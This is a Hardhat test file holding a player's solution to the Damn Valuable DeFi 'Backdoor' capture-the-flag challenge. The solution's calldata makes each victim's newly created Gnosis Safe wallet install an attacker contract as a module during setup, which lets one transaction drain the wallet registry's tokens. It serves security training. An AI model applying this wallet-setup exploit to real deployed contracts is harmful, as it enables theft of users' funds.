const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Backdoor', function () {
    let deployer, users, player;
    let masterCopy, walletFactory, token, walletRegistry;

    const AMOUNT_TOKENS_DISTRIBUTED = 40n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
        users = [alice.address, bob.address, charlie.address, david.address]

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = await (await ethers.getContractFactory('GnosisSafe', deployer)).deploy();
        walletFactory = await (await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)).deploy();
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        
        // Deploy the registry
        walletRegistry = await (await ethers.getContractFactory('WalletRegistry', deployer)).deploy(
            masterCopy.address,
            walletFactory.address,
            token.address,
            users
        );
        expect(await walletRegistry.owner()).to.eq(deployer.address);

        for (let i = 0; i < users.length; i++) {
            // Users are registered as beneficiaries
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.true;

            // User cannot add beneficiaries
            await expect(
                walletRegistry.connect(
                    await ethers.getSigner(users[i])
                ).addBeneficiary(users[i])
            ).to.be.revertedWithCustomError(walletRegistry, 'Unauthorized');
        }

        // Transfer tokens to be distributed to the registry
        await token.transfer(walletRegistry.address, AMOUNT_TOKENS_DISTRIBUTED);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        // deploy FakeSafe contract
        const fakeSafe = await (await ethers.getContractFactory('contracts/backdoor/FakeSafe.sol:FakeSafe', deployer)).deploy();
        const attacker = await (await ethers.getContractFactory('contracts/backdoor/Attacker.sol:Attacker', deployer)).deploy();

        const safeABI = ['function setup(address[],uint256,address,bytes,address,address,uint256,address) external'];
        const safeInterface = new ethers.utils.Interface(safeABI);

        /**
         * 
         * we need to craft the setup function data
         * 
         *  /// @dev Setup function sets initial storage of contract.
        /// @param _owners List of Safe owners.
        /// @param _threshold Number of required confirmations for a Safe transaction.
        /// @param to Contract address for optional delegate call.
        /// @param data Data payload for optional delegate call.
        /// @param fallbackHandler Handler for fallback calls to this contract
        /// @param paymentToken Token that should be used for the payment (0 is ETH)
        /// @param payment Value that should be paid
        /// @param paymentReceiver Adddress that should receive the payment (or 0 if tx.origin)
        function setup(
            address[] calldata _owners,
            uint256 _threshold,
            address to,
            bytes calldata data,
            address fallbackHandler,
            address paymentToken,
            uint256 payment,
            address payable paymentReceiver
        ) external {
            // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
            setupOwners(_owners, _threshold);
            if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
            // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
            setupModules(to, data);

            if (payment > 0) {
                // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
                // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
                handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
            }
            emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
        }
         */
        const datalist = []
        for (let i = 0; i < users.length; i++) {
            const setupdata = safeInterface.encodeFunctionData('setup', [
                [users[i]],
                1,
                fakeSafe.address,
                fakeSafe.interface.encodeFunctionData('enableModule2', [attacker.address]),
                ethers.constants.AddressZero,
                ethers.constants.AddressZero,
                0,
                ethers.constants.AddressZero
            ]);
     
            const createwalletdata = walletFactory.interface.encodeFunctionData('createProxyWithCallback', [
                masterCopy.address, 
                setupdata, 
                i, 
                walletRegistry.address 
            ]);
            datalist.push(createwalletdata);
            /**
             * 
             *  function createProxyWithCallback(
                    address _singleton,
                    bytes memory initializer,
                    uint256 saltNonce,
                    IProxyCreationCallback callback
                ) public returns (GnosisSafeProxy proxy) {
                    uint256 saltNonceWithCallback = uint256(keccak256(abi.encodePacked(saltNonce, callback)));
                    proxy = createProxyWithNonce(_singleton, initializer, saltNonceWithCallback);
                    if (address(callback) != address(0)) callback.proxyCreated(proxy, _singleton, initializer, saltNonce);
                }
             */
            // walletFactory.createProxyWithCallback(masterCopy.address, setupdata, i, fakeSafe.address);
        }
        await attacker.connect(player).attack(datalist, token.address, walletFactory.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player must have used a single transaction
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(1);

        for (let i = 0; i < users.length; i++) {
            let wallet = await walletRegistry.wallets(users[i]);
            
            // User must have registered a wallet
            expect(wallet).to.not.eq(
                ethers.constants.AddressZero,
                'User did not register a wallet'
            );

            // User is no longer registered as a beneficiary
            expect(
                await walletRegistry.beneficiaries(users[i])
            ).to.be.false;
        }

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(AMOUNT_TOKENS_DISTRIBUTED);
    });
});
